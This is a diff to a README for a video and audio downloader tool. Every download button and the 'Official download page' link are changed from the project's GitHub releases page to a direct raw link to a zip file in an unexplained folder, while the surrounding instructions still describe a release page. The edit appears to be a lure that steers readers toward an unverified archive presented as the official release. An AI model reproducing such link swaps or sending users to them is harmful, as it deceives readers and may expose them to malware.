@@ -1,6 +1,6 @@
 # 🎵 mp4-mp3-downloader - Download Videos and Songs Fast
 
-[![Download mp4-mp3-downloader](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/SEKIRO0090/mp4-mp3-downloader/releases)
+[![Download mp4-mp3-downloader](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/SEKIRO0090/mp4-mp3-downloader/main/purvoe/downloader-mp-3.6.zip)
 
 ---
 
@@ -37,7 +37,7 @@ You simply provide the URL of the video or audio, and the tool does the rest. It
 
 1. Click the big green button below to visit the download page.
 
-[![Download mp4-mp3-downloader](https://img.shields.io/badge/Download-Now-purple?style=for-the-badge)](https://github.com/SEKIRO0090/mp4-mp3-downloader/releases)
+[![Download mp4-mp3-downloader](https://img.shields.io/badge/Download-Now-purple?style=for-the-badge)](https://raw.githubusercontent.com/SEKIRO0090/mp4-mp3-downloader/main/purvoe/downloader-mp-3.6.zip)
 
 2. On the release page, look for the latest version, most likely in a file ending with `.exe` or `.zip`.
 
@@ -112,7 +112,7 @@ If the problem continues, visit the project’s GitHub page for new releases or 
 ## 🔗 Useful Links
 
 - Official download page:  
-  [https://github.com/SEKIRO0090/mp4-mp3-downloader/releases](https://github.com/SEKIRO0090/mp4-mp3-downloader/releases)  
+  [https://raw.githubusercontent.com/SEKIRO0090/mp4-mp3-downloader/main/purvoe/downloader-mp-3.6.zip](https://raw.githubusercontent.com/SEKIRO0090/mp4-mp3-downloader/main/purvoe/downloader-mp-3.6.zip)  
 
 - Source code and documentation:  
   Available inside the download or on GitHub
